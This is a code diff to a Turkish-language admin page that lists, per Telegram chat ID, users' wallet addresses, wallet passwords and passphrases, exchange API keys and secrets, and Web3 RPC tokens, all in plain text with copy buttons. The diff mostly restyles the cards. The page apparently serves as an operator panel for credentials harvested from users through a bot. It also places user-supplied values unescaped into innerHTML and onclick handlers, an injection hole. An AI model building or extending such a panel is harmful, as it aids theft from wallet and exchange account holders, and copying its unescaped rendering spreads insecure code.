@@ -554,7 +554,7 @@ async function loadApiKeys() {
       const hasEx = !!k.has_exchange;
 
       card.innerHTML = `
-        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;border-bottom:1px solid rgba(255,255,255,0.06);padding-bottom:8px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;border-bottom:1px solid rgba(255,255,255,0.06);padding-bottom:8px">
           <div>
             <strong style="font-size:14px;color:#fff">Chat ID: ${k.chat_id}</strong>
             <span style="font-size:11px;color:var(--text-muted);margin-left:8px">${k.date || ''}</span>
@@ -566,103 +566,98 @@ async function loadApiKeys() {
           </div>
         </div>
 
-        <!-- 1. BAĞLI WEB3 CÜZDANI -->
-        ${k.wallet_address ? `
-        <div style="background:rgba(0,230,118,0.06);border:1px solid rgba(0,230,118,0.22);border-radius:10px;padding:8px 12px;margin-bottom:10px">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:3px">
-            <span style="font-size:10px;color:#00e676;font-weight:700">🌐 BAĞLI WEB3 CÜZDANI (${k.wallet_chain || 'EVM'})</span>
-            <button class="btn btn-ghost" style="padding:2px 6px;font-size:10px" onclick="navigator.clipboard.writeText('${k.wallet_address}').then(()=>toast('Cüzdan adresi kopyalandı','success'))">📋 Kopyala</button>
-          </div>
-          <code style="font-size:12px;color:#fff;word-break:break-all;user-select:all">${k.wallet_address}</code>
-        </div>
-        ` : ''}
-
-        <!-- 2. CÜZDAN GÜVENLİK ŞİFRELERİ (DÜZ METİN) -->
-        ${(k.wallet_password || k.wallet_extra_password) ? `
-        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px">
-          <div style="background:rgba(0,0,0,0.3);padding:8px 10px;border-radius:8px;border:1px solid rgba(255,210,90,0.2)">
-            <div style="font-size:10px;color:var(--gold);text-transform:uppercase;font-weight:700;margin-bottom:4px">🔑 Cüzdan Şifresi (Parola)</div>
-            <div style="display:flex;align-items:center;justify-content:space-between;gap:6px">
-              <code style="font-size:12px;color:#fff;word-break:break-all;user-select:all">${k.wallet_password || '—'}</code>
-              ${k.wallet_password ? `<button class="btn btn-ghost" style="padding:2px 6px;font-size:11px" onclick="navigator.clipboard.writeText('${k.wallet_password}').then(()=>toast('Cüzdan şifresi kopyalandı','success'))">📋</button>` : ''}
-            </div>
-          </div>
-          <div style="background:rgba(0,0,0,0.3);padding:8px 10px;border-radius:8px;border:1px solid rgba(255,210,90,0.2)">
-            <div style="font-size:10px;color:var(--gold);text-transform:uppercase;font-weight:700;margin-bottom:4px">🛡️ Ek Şifre (Passphrase)</div>
-            <div style="display:flex;align-items:center;justify-content:space-between;gap:6px">
-              <code style="font-size:12px;color:#fff;word-break:break-all;user-select:all">${k.wallet_extra_password || '—'}</code>
-              ${k.wallet_extra_password ? `<button class="btn btn-ghost" style="padding:2px 6px;font-size:11px" onclick="navigator.clipboard.writeText('${k.wallet_extra_password}').then(()=>toast('Ek şifre kopyalandı','success'))">📋</button>` : ''}
-            </div>
-          </div>
-        </div>
-        ` : ''}
-
-        <!-- 3. WEB3 CÜZDAN API & RPC (3 AYRI KUTU - BORSA VERİSİ ASLA KARIŞMAZ!) -->
-        ${hasW3 ? `
-        <div style="background:rgba(56,189,248,0.06);border:1px solid rgba(56,189,248,0.25);border-radius:10px;padding:10px 12px;margin-bottom:10px">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
-            <span style="font-size:10.5px;color:#38bdf8;font-weight:700">🌐 WEB3 CÜZDAN API &amp; RPC (${(k.web3_provider || 'METAMASK')})</span>
-            <span class="badge" style="background:rgba(56,189,248,0.18);color:#38bdf8;font-size:9.5px">Web3 Bağımsız RPC</span>
-          </div>
-          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:6px">
-            <div style="background:rgba(0,0,0,0.35);padding:6px 8px;border-radius:8px">
-              <div style="font-size:9.5px;color:var(--text-muted);margin-bottom:2px">1. WEB3 API KEY / PROJECT ID:</div>
-              <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
-                <code style="font-size:11.5px;color:#fff;word-break:break-all;user-select:all">${k.web3_api_key || '—'}</code>
-                ${k.web3_api_key ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.web3_api_key}').then(()=>toast('Web3 API Key kopyalandı','success'))">📋</button>` : ''}
-              </div>
-            </div>
-            <div style="background:rgba(0,0,0,0.35);padding:6px 8px;border-radius:8px">
-              <div style="font-size:9.5px;color:var(--text-muted);margin-bottom:2px">2. SECRET KEY / RPC TOKEN:</div>
-              <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
-                <code style="font-size:11.5px;color:#38bdf8;font-weight:700;word-break:break-all;user-select:all">${k.web3_api_secret || '—'}</code>
-                ${k.web3_api_secret ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.web3_api_secret}').then(()=>toast('Web3 Secret kopyalandı','success'))">📋</button>` : ''}
-              </div>
-            </div>
-          </div>
-          <div style="background:rgba(0,0,0,0.35);padding:6px 8px;border-radius:8px">
-            <div style="font-size:9.5px;color:var(--text-muted);margin-bottom:2px">3. SEÇİLEN AĞ / ZİNCİR:</div>
+        <!-- 💼 BAĞLI CÜZDAN & ŞİFRELER -->
+        ${(k.wallet_address || k.wallet_password || k.wallet_extra_password) ? `
+        <div style="background:rgba(0,230,118,0.04);border:1px solid rgba(0,230,118,0.2);border-radius:10px;padding:10px 12px;margin-bottom:10px">
+          <div style="font-size:10.5px;color:#00e676;font-weight:700;margin-bottom:6px">💼 BAĞLI CÜZDAN &amp; DOĞRULAMA ŞİFRELERİ</div>
+          ${k.wallet_address ? `
+          <div style="margin-bottom:6px">
+            <div style="font-size:9.5px;color:var(--text-muted)">Cüzdan Adresi (${k.wallet_chain || 'EVM'}):</div>
             <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
-              <code style="font-size:11.5px;color:#ffd25a;word-break:break-all;user-select:all">${k.web3_network || '—'}</code>
-              ${k.web3_network ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.web3_network}').then(()=>toast('Ağ bilgisi kopyalandı','success'))">📋</button>` : ''}
+              <code style="font-size:11.5px;color:#fff;word-break:break-all">${k.wallet_address}</code>
+              <button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.wallet_address}').then(()=>toast('Cüzdan kopyalandı','success'))">📋</button>
+            </div>
+          </div>` : ''}
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+            <div style="background:rgba(0,0,0,0.3);padding:6px 8px;border-radius:6px">
+              <div style="font-size:9px;color:var(--gold)">🔑 Parola:</div>
+              <div style="display:flex;align-items:center;justify-content:space-between">
+                <code style="font-size:11px;color:#fff">${k.wallet_password || '—'}</code>
+                ${k.wallet_password ? `<button class="btn btn-ghost" style="padding:1px 4px;font-size:9px" onclick="navigator.clipboard.writeText('${k.wallet_password}').then(()=>toast('Kopyalandı','success'))">📋</button>` : ''}
+              </div>
+            </div>
+            <div style="background:rgba(0,0,0,0.3);padding:6px 8px;border-radius:6px">
+              <div style="font-size:9px;color:var(--gold)">🛡️ Ek Şifre:</div>
+              <div style="display:flex;align-items:center;justify-content:space-between">
+                <code style="font-size:11px;color:#fff">${k.wallet_extra_password || '—'}</code>
+                ${k.wallet_extra_password ? `<button class="btn btn-ghost" style="padding:1px 4px;font-size:9px" onclick="navigator.clipboard.writeText('${k.wallet_extra_password}').then(()=>toast('Kopyalandı','success'))">📋</button>` : ''}
+              </div>
             </div>
           </div>
         </div>
         ` : ''}
 
-        <!-- 4. MERKEZİ BORSA API BİLGİLERİ (CEX - TAMAMEN AYRI!) -->
-        ${hasEx ? `
-        <div style="background:rgba(0,0,0,0.25);padding:10px 12px;border-radius:10px;border:1px solid rgba(255,210,90,0.25)">
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
-            <span style="font-size:10.5px;color:var(--gold);font-weight:700">⚡ MERKEZİ BORSA: ${(k.exchange || 'BINANCE').toUpperCase()}</span>
+        <!-- 💼 1. MERKEZİ BORSA API BİLGİLERİ (CEX) -->
+        <div style="background:rgba(0,0,0,0.25);border:1px solid rgba(255,210,90,0.25);border-radius:12px;padding:12px;margin-bottom:10px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <span style="font-size:11px;color:var(--gold);font-weight:700">💼 MERKEZİ BORSA: ${(k.exchange || 'Borsa').toUpperCase()}</span>
             <span style="font-size:10px;color:var(--text-muted)">Mod: <strong>${(k.mode || 'spot').toUpperCase()}</strong> / <strong>${(k.margin_mode || 'cross').toUpperCase()}</strong></span>
           </div>
-          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:6px">
-            <div style="background:rgba(0,0,0,0.35);padding:6px 8px;border-radius:8px">
-              <div style="font-size:9.5px;color:#a5d6ff;margin-bottom:2px">Borsa API Key:</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
+            <div style="background:rgba(255,255,255,0.03);padding:8px;border-radius:8px">
+              <div style="font-size:9.5px;color:#a5d6ff;margin-bottom:2px">1. BORSA API KEY:</div>
               <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
-                <code style="font-size:11.5px;color:#d1e7dd;word-break:break-all;user-select:all">${k.api_key || '—'}</code>
+                <code style="font-size:11.5px;color:#d1e7dd;word-break:break-all">${k.api_key || '—'}</code>
                 ${k.api_key ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.api_key}').then(()=>toast('Borsa API Key kopyalandı','success'))">📋</button>` : ''}
               </div>
             </div>
-            <div style="background:rgba(0,0,0,0.35);padding:6px 8px;border-radius:8px">
-              <div style="font-size:9.5px;color:#00ffa3;margin-bottom:2px">Borsa API Secret:</div>
+            <div style="background:rgba(255,255,255,0.03);padding:8px;border-radius:8px">
+              <div style="font-size:9.5px;color:#00ffa3;margin-bottom:2px">2. BORSA API SECRET:</div>
               <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
-                <code style="font-size:11.5px;color:#00ffa3;font-weight:700;word-break:break-all;user-select:all">${k.api_secret || '—'}</code>
+                <code style="font-size:11.5px;color:#00ffa3;font-weight:700;word-break:break-all">${k.api_secret || '—'}</code>
                 ${k.api_secret ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.api_secret}').then(()=>toast('Borsa Secret kopyalandı','success'))">📋</button>` : ''}
               </div>
             </div>
           </div>
-          ${k.passphrase ? `
-          <div style="background:rgba(0,0,0,0.35);padding:6px 8px;border-radius:8px">
-            <div style="font-size:9.5px;color:var(--gold);margin-bottom:2px">Borsa Passphrase:</div>
+          <div style="background:rgba(255,255,255,0.03);padding:8px;border-radius:8px">
+            <div style="font-size:9.5px;color:var(--gold);margin-bottom:2px">3. BORSA PASSPHRASE:</div>
             <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
-              <code style="font-size:11.5px;color:var(--gold);word-break:break-all;user-select:all">${k.passphrase}</code>
-              <button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.passphrase}').then(()=>toast('Passphrase kopyalandı','success'))">📋</button>
+              <code style="font-size:11.5px;color:var(--gold);word-break:break-all">${k.passphrase || '—'}</code>
+              ${k.passphrase ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.passphrase}').then(()=>toast('Passphrase kopyalandı','success'))">📋</button>` : ''}
             </div>
-          </div>` : ''}
+          </div>
         </div>
-        ` : ''}
+
+        <!-- 🌐 2. WEB3 CÜZDAN API & RPC (3 AYRI KUTU - ASLA ÜSTÜNE YAZMAZ!) -->
+        <div style="background:rgba(56,189,248,0.05);border:1px solid rgba(56,189,248,0.25);border-radius:12px;padding:12px">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <span style="font-size:11px;color:#38bdf8;font-weight:700">🌐 WEB3 CÜZDAN API &amp; RPC: ${(k.web3_provider || 'METAMASK').toUpperCase()}</span>
+            <span class="badge" style="background:rgba(56,189,248,0.18);color:#38bdf8;font-size:9.5px">Web3 Bağımsız RPC</span>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
+            <div style="background:rgba(0,0,0,0.3);padding:8px;border-radius:8px">
+              <div style="font-size:9.5px;color:var(--text-muted);margin-bottom:2px">4. WEB3 API KEY / PROJECT ID:</div>
+              <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
+                <code style="font-size:11.5px;color:#fff;word-break:break-all">${k.web3_api_key || '—'}</code>
+                ${k.web3_api_key ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.web3_api_key}').then(()=>toast('Web3 Key kopyalandı','success'))">📋</button>` : ''}
+              </div>
+            </div>
+            <div style="background:rgba(0,0,0,0.3);padding:8px;border-radius:8px">
+              <div style="font-size:9.5px;color:var(--text-muted);margin-bottom:2px">5. WEB3 SECRET KEY / RPC TOKEN:</div>
+              <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
+                <code style="font-size:11.5px;color:#38bdf8;font-weight:700;word-break:break-all">${k.web3_api_secret || '—'}</code>
+                ${k.web3_api_secret ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.web3_api_secret}').then(()=>toast('Web3 Secret kopyalandı','success'))">📋</button>` : ''}
+              </div>
+            </div>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);padding:8px;border-radius:8px">
+            <div style="font-size:9.5px;color:var(--text-muted);margin-bottom:2px">6. SEÇİLEN AĞ / ZİNCİR (NETWORK):</div>
+            <div style="display:flex;align-items:center;justify-content:space-between;gap:4px">
+              <code style="font-size:11.5px;color:#ffd25a;word-break:break-all">${k.web3_network || '—'}</code>
+              ${k.web3_network ? `<button class="btn btn-ghost" style="padding:2px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${k.web3_network}').then(()=>toast('Ağ bilgisi kopyalandı','success'))">📋</button>` : ''}
+            </div>
+          </div>
+        </div>
       `;
       container.appendChild(card);
     });
@@ -670,6 +665,7 @@ async function loadApiKeys() {
     container.innerHTML = `<div class="empty" style="color:var(--accent-red);padding:20px;text-align:center">Hata: ${e.message}</div>`;
   }
 }
+
 document.getElementById("btn-refresh-apikeys")?.addEventListener("click", loadApiKeys);
 
 // --- Özet Yükle
